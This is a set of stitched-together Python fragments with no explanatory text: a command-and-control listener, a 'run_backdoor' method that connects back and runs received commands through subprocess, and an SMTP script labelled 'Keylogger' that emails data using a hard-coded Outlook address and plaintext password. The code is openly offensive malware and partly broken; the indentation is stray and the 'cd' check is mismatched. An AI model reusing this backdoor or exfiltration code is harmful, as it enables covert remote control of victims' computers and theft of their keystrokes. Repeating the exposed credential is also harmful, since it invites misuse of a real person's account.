import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(("127.0.0.1", 8888))
s.listen(5)

client, addr = s.accept()

cmd_mode = False
while True:
    command = str(input("Enter command >> ")) if not cmd_mode else str(input())
    client.send(command.encode())
    if command == "exit":
        break
    if command == "cmd on":
        cmd_mode = True
    if command == "cmd off":
        cmd_mode = False
    result_output = client.recv(1024 * 4).decode()
    print(result_output)

client.close()
s.close()

    def run_backdoor(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("127.0.0.1", 8888))
        while True:
            command = s.recv(1024 * 4).decode()
            self.log("Received command: " + command)

            cmd_mode = False
            if command == "exit":
                break
            elif command == "cmd on":
                cmd_mode = True
                self.handle_cmd("cmd", socket)
            elif command == "cmd off":
                cmd_mode = False
            else:
                s.send("Command unrecognised".encode())

            if cmd_mode:
                self.handle_cmd(command, s)

    def handle_cmd(self, command, socket):
        self.log("Executing shell command: " + command)
        if command[:3] == "cd":
            os.chdir(command[3:])
            cwd = os.getcwd().replace("\\", '/') + ">"
            socket.send(cwd)
        else:
            output = subprocess.getoutput(command)
            cwd = os.getcwd().replace("\\", '/') + ">"
            socket.send((output+f"\n{cwd}").encode())


import smtplib

user = "dobrioglo0709@outlook.com"
password = "^A^X%$=mM3/vH_n"

sent_from = 'dobrioglo0709@outlook.com'
to = ['dobrioglo07092006@gmail.com', 'dobrioglo0709@outlook.com']
subject = 'Keylogger'
body = "Hey, what's up?\n\n- You"

email_text = """\
From: %s
To: %s
Subject: %s

% s
""" % (sent_from, ", ".join(to), subject, body)

try:
    server = smtplib.SMTP('smtp-mail.outlook.com', 587)
    server.starttls()
    server.login(user, password)
    server.sendmail(sent_from, to, email_text)
    server.close()
    print("Email sent!")
except Exception as ex:
    print(f"Error:\n{ex}")
